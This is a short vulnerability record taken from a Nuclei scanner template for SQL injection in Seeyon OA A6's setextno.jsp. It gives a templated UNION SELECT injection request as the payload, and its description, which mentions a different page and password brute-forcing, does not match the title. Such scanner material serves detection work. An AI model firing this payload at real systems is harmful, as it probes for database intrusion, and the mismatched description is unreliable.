# Vulnerability: Seeyon OA A6 setextno.jsp - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`seeyon-oa-setextno-sqli.yaml`)

## Description
Seeyon OA A6 initDataAssess.jsp has leaked user sensitive information,You can blast the user password through the obtained username to enter the background for further attacks

## Vulnerable Code Pattern / Exploit Payload
```http
GET /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+all+select+1,2,(md5({{num}})),4# HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

